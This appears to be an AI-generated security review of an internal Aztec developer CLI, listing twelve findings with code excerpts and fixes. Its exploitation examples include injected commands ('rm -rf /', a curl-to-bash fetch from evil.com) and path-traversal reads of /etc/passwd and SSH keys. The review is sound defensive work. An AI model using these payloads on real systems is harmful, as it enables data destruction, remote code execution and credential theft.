# Security Review: CAZT CLI Tool

**Date**: 2025-12-05
**Reviewer**: Claude Code Security Analysis
**Scope**: Full codebase review including build scripts
**Context**: Internal developer tool

---

## Executive Summary

CAZT is a CLI utility for Aztec Network developers, providing cryptographic operations, note management, contract deployment, and RPC communication. The review identified **12 security findings** across the codebase:

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 1 | Requires attention |
| High | 2 | Requires attention |
| Medium | 5 | Recommended fix |
| Low | 4 | Advisory |

**Overall Risk Assessment**: For an internal developer tool, the risk is **Moderate**. The critical command injection vulnerability in the build script requires attention, as it could be exploited if untrusted input reaches the script. The path traversal issues are less critical in an internal context but should be addressed before any public release.

---

## Detailed Findings

### CRITICAL-001: Command Injection in Build Script

**Severity**: Critical
**File**: `scripts/build-aztec-standards.ts`
**Lines**: 22, 33, 108-113, 141, 219-220

**Description**:
The build script uses `spawnSync` with `shell: true` and interpolates user-provided input (`commitOrTag`) directly into shell commands without sanitization.

**Vulnerable Code**:
```typescript
// Line 22
function run(cmd: string, opts: Record<string, any> = {}) {
  const res = spawnSync(cmd, { stdio: "inherit", shell: true, ...opts });
  // ...
}

// Lines 219-220
run(`git clone ${REPO} "${repoDir}" --quiet`);
run(`git -C "${repoDir}" checkout ${commitOrTag} --quiet`);

// Lines 108-113
return tryRun(`cd "${repoDir}" && yarn ${command}`);
return tryRun(`cd "${repoDir}" && pnpm ${command}`);
```

**Exploitation Scenario**:
```bash
# Malicious input could execute arbitrary commands
yarn build-aztec-standards "v1.0.0; rm -rf /"
yarn build-aztec-standards "$(curl evil.com/shell.sh | bash)"
```

**Risk in Context**: Since this is an internal tool and the `commitOrTag` comes from command-line arguments (typically run by developers), the risk is lower than a web-facing application. However, automated CI/CD pipelines that pass external input could be vulnerable.

**Recommendation**:
1. Validate `commitOrTag` against a strict pattern (e.g., `/^[a-zA-Z0-9._-]+$/`)
2. Use array-based arguments without `shell: true`:
```typescript
spawnSync('git', ['clone', REPO, repoDir, '--quiet'], { stdio: 'inherit' });
spawnSync('git', ['-C', repoDir, 'checkout', commitOrTag, '--quiet'], { stdio: 'inherit' });
```

---

### HIGH-001: Path Traversal via @ Prefix

**Severity**: High
**File**: `cli/utils/rpc.ts`
**Lines**: 166-169

**Description**:
The `parseJsonOrFile` function accepts user input prefixed with `@` to read files, but performs no path validation. This allows reading arbitrary files on the system.

**Vulnerable Code**:
```typescript
if (input.startsWith('@')) {
  const filePath = input.slice(1);  // No validation
  const content = readFileSync(filePath, 'utf-8');
  return JSON.parse(content);
}
```

**Exploitation Scenario**:
```bash
# Read sensitive files
cazt abi-encode --artifact @/etc/passwd
cazt abi-encode --artifact @../../../private/secrets.json
cazt abi-encode --artifact @~/.ssh/id_rsa
```

**Risk in Context**: As an internal tool run by developers on their own machines, the risk is self-inflicted. However, if used in shared environments or CI/CD, this could leak sensitive data.

**Recommendation**:
```typescript
if (input.startsWith('@')) {
  const filePath = path.resolve(input.slice(1));
  const cwd = process.cwd();

  // Ensure path is within current working directory or allowed paths
  if (!filePath.startsWith(cwd)) {
    throw new Error(`Path traversal detected: ${filePath} is outside ${cwd}`);
  }

  const content = readFileSync(filePath, 'utf-8');
  return JSON.parse(content);
}
```

---

### HIGH-002: Insufficient Artifact Name Validation

**Severity**: High
**File**: `cli/utils/rpc.ts`
**Lines**: 105-163

**Description**:
Contract names extracted from `source:ContractName` format are not validated. While path separators are filtered, the name is used in file system operations and could contain special characters.

**Vulnerable Code**:
```typescript
if (input.includes(':') && !input.startsWith('@') && !input.includes('/') && !input.includes('\\')) {
  const [source, contractName] = input.split(':');
  // contractName is used without validation
  const matchingFile = files.find((f: string) =>
    f.endsWith('.json') && f.includes(contractName)  // Substring match
  );
}
```

**Risk in Context**: Lower severity in practice since the lookup is against a fixed directory of JSON files. However, the substring match could lead to loading unintended files.

**Recommendation**:
```typescript
const VALID_CONTRACT_NAME = /^[a-zA-Z][a-zA-Z0-9_]*$/;
if (!VALID_CONTRACT_NAME.test(contractName)) {
  throw new Error(`Invalid contract name: ${contractName}`);
}
```

---

### MEDIUM-001: Secret Key Logging in Debug Mode

**Severity**: Medium
**File**: `cli/utils/note.ts`
**Line**: 206

**Description**:
When debug mode is enabled, secret keys are logged to stdout with only the first 20 characters truncated. This could expose sensitive key material in log files.

**Vulnerable Code**:
```typescript
debugLog(`[DEBUG] Creating account ${i + 1}/${secretKeys.length}:`, {
  secretKey: secretKey.toString().substring(0, 20) + '...',  // Partial exposure
  salt: saltToUse.toString(),
});
```

**Risk in Context**: Debug mode must be explicitly enabled. However, developers may accidentally commit logs or share terminal output containing partial keys.

**Recommendation**:
```typescript
debugLog(`[DEBUG] Creating account ${i + 1}/${secretKeys.length}:`, {
  secretKey: '***REDACTED***',  // Or hash/fingerprint
  salt: saltToUse.toString(),
});
```

---

### MEDIUM-002: Empty Catch Blocks Suppress Errors

**Severity**: Medium
**Files**:
- `scripts/build-aztec-standards.ts:35, 285`
- `cli/utils/rpc.ts:81, 180`
- `cli/utils/storage.ts:28`
- `cli/utils/abi.ts:50, 59, 68, 77, 86, 95`
- `cli/utils/artifact.ts:28`

**Description**:
Multiple empty `catch {}` blocks silently swallow errors, making debugging difficult and potentially hiding security-relevant failures.

**Example**:
```typescript
// build-aztec-standards.ts:284-285
try {
  fs.rmSync(tmp, { recursive: true, force: true });
} catch {}  // Cleanup failure silently ignored
```

**Risk in Context**: Primarily affects debugging and error visibility. Could mask security-relevant failures (e.g., failed cleanup leaving sensitive data).

**Recommendation**: Log errors to stderr at minimum:
```typescript
} catch (error) {
  console.error('[WARN] Cleanup failed:', error);
}
```

---

### MEDIUM-003: Unsafe Type Casting (`as any`)

**Severity**: Medium
**Files**:
- `cli/utils/note.ts:99, 172, 337`
- `cli/utils/deployment.ts:56, 177`
- `cli/utils/contract.ts:67, 81, 97`
- `cli/utils/storage.ts:54`

**Description**:
Extensive use of `as any` bypasses TypeScript's type safety, allowing unexpected runtime behavior and potential crashes.

**Example**:
```typescript
// note.ts:99
contractArtifact = loadContractArtifact(artifactJson as any);

// contract.ts:67
const result = await computeContractAddressFromInstance(convertedInstance as any);
```

**Risk in Context**: Primarily a code quality issue. Could lead to runtime errors if unexpected data shapes are passed.

**Recommendation**: Define proper interfaces and use type guards:
```typescript
interface ArtifactJson {
  name: string;
  functions: FunctionAbi[];
  // ...
}

function isValidArtifact(obj: unknown): obj is ArtifactJson {
  return typeof obj === 'object' && obj !== null && 'name' in obj;
}
```

---

### MEDIUM-004: Race Condition in Temp Directory Cleanup

**Severity**: Medium
**File**: `scripts/build-aztec-standards.ts`
**Lines**: 211, 284

**Description**:
The build script uses a temporary directory and cleans it up with `fs.rmSync(..., { force: true })`. While `mkdtempSync` creates a unique directory, the cleanup could be vulnerable to symlink race conditions.

**Vulnerable Code**:
```typescript
const tmp = fs.mkdtempSync(path.join(userHome, ".aztec-standards-build-"));
// ...later...
fs.rmSync(tmp, { recursive: true, force: true });
```

**Risk in Context**: Requires local attacker with write access to user home directory. Low probability in typical developer environments.

**Recommendation**: Verify the temp directory before cleanup:
```typescript
const stat = fs.lstatSync(tmp);
if (!stat.isDirectory()) {
  throw new Error('Temp directory was replaced with a symlink');
}
fs.rmSync(tmp, { recursive: true, force: true });
```

---

### MEDIUM-005: Constructor Arguments Parsed Without Schema Validation

**Severity**: Medium
**File**: `cli/utils/deployment.ts`
**Lines**: 128-135

**Description**:
Constructor arguments are parsed from JSON or comma-separated strings without validation against the contract ABI.

**Vulnerable Code**:
```typescript
let parsedConstructorArgs = constructorArgs;
if (typeof constructorArgs === 'string') {
  try {
    parsedConstructorArgs = JSON.parse(constructorArgs);
  } catch {
    // If not JSON, treat as comma-separated values
    parsedConstructorArgs = constructorArgs.split(',').map((arg: string) => arg.trim());
  }
}
```

**Risk in Context**: Could lead to contract deployment failures with unclear error messages. No direct security impact but affects usability.

**Recommendation**: Validate arguments against the constructor ABI before deployment.

---

### LOW-001: Hardcoded Network Endpoints

**Severity**: Low
**File**: `cli/config/index.ts`
**Lines**: 8-11, 16-21

**Description**:
Network URLs are hardcoded without TLS certificate validation options.

**Code**:
```typescript
export const NETWORK_URLS: Record<string, string> = {
  devnet: 'https://devnet.aztec-labs.com',
  testnet: 'https://aztec-testnet-fullnode.zkv.xyz',
};

export const DEFAULT_URLS = {
  RPC: 'http://localhost:8080',  // HTTP for local
  ADMIN: 'http://localhost:8880',
};
```

**Risk in Context**: Default localhost URLs use HTTP (insecure), which is acceptable for local development. Remote URLs use HTTPS.

**Recommendation**: Consider adding `--insecure-skip-tls-verify` flag for testing environments only.

---

### LOW-002: Unbounded Package.json Search

**Severity**: Low
**Files**:
- `cli/utils/rpc.ts:72-95`
- `cli/utils/artifact.ts:13-46`

**Description**:
The code searches up to 10 parent directories for `package.json`. In edge cases, this could load configuration from an unexpected directory.

**Risk in Context**: Unlikely to cause issues in typical usage. Could be exploited if a malicious `package.json` exists in a parent directory.

**Recommendation**: Add environment variable to explicitly set package root.

---

### LOW-003: No Rate Limiting on RPC Calls

**Severity**: Low
**File**: `cli/utils/rpc.ts:23-47`

**Description**:
RPC calls have no rate limiting or retry logic. While not a direct security issue, aggressive usage could cause denial of service to the target RPC endpoint.

**Risk in Context**: Self-inflicted risk; user controls the target URL.

**Recommendation**: Add optional rate limiting for production use.

---

### LOW-004: ECDH Implementation Relies on Library

**Severity**: Low (Informational)
**File**: `cli/utils/log.ts:118-125`

**Description**:
Private log decryption uses ECDH key derivation from the `@aztec/stdlib` library. The implementation appears correct but security depends on the underlying library.

**Observation**:
```typescript
const recipientIvskM = deriveMasterIncomingViewingSecretKey(Helpers.stringToFr(recipientSecretKey));
const addressSecret = await computeAddressSecret(preaddress, recipientIvskM);
const sharedSecret = await deriveEcdhSharedSecret(addressSecret, ephPk);
```

**Risk in Context**: No issues identified. Cryptographic operations are delegated to well-maintained Aztec libraries.

---

## Summary Table

| ID | Severity | File | Issue | Recommendation |
|----|----------|------|-------|----------------|
| CRITICAL-001 | Critical | build-aztec-standards.ts | Command injection via shell: true | Use array args, validate input |
| HIGH-001 | High | rpc.ts | Path traversal via @ prefix | Validate paths within cwd |
| HIGH-002 | High | rpc.ts | Insufficient artifact name validation | Regex validation |
| MEDIUM-001 | Medium | note.ts | Secret key in debug logs | Redact entirely |
| MEDIUM-002 | Medium | Multiple | Empty catch blocks | Log errors |
| MEDIUM-003 | Medium | Multiple | Unsafe type casting | Define proper types |
| MEDIUM-004 | Medium | build-aztec-standards.ts | Symlink race in temp cleanup | Verify before delete |
| MEDIUM-005 | Medium | deployment.ts | No constructor arg validation | Schema validation |
| LOW-001 | Low | config/index.ts | Hardcoded endpoints | Optional TLS skip flag |
| LOW-002 | Low | rpc.ts, artifact.ts | Unbounded parent search | Explicit root config |
| LOW-003 | Low | rpc.ts | No RPC rate limiting | Optional rate limit |
| LOW-004 | Low | log.ts | Crypto relies on library | Informational |

---

## Recommendations Priority

### Immediate (Before Next Release)
1. Fix CRITICAL-001: Command injection in build script

### Short-term
2. Fix HIGH-001: Path traversal validation
3. Fix HIGH-002: Artifact name validation
4. Fix MEDIUM-001: Remove secret key from debug logs

### Long-term (Before Public Release)
5. Address remaining MEDIUM and LOW findings
6. Add input validation schemas across all commands
7. Consider security audit by external party before public npm publish

---

## Files Reviewed

| File | LOC | Status |
|------|-----|--------|
| scripts/build-aztec-standards.ts | 294 | Reviewed |
| cli/utils/rpc.ts | 188 | Reviewed |
| cli/utils/artifact.ts | 245 | Reviewed |
| cli/utils/note.ts | 720 | Reviewed |
| cli/utils/deployment.ts | 211 | Reviewed |
| cli/utils/log.ts | 157 | Reviewed |
| cli/utils/hash.ts | 175 | Reviewed |
| cli/utils/helpers.ts | 52 | Reviewed |
| cli/utils/abi.ts | 120 | Reviewed |
| cli/utils/storage.ts | 81 | Reviewed |
| cli/utils/contract.ts | 121 | Reviewed |
| cli/config/index.ts | 66 | Reviewed |

**Total Lines Reviewed**: ~2,430 LOC
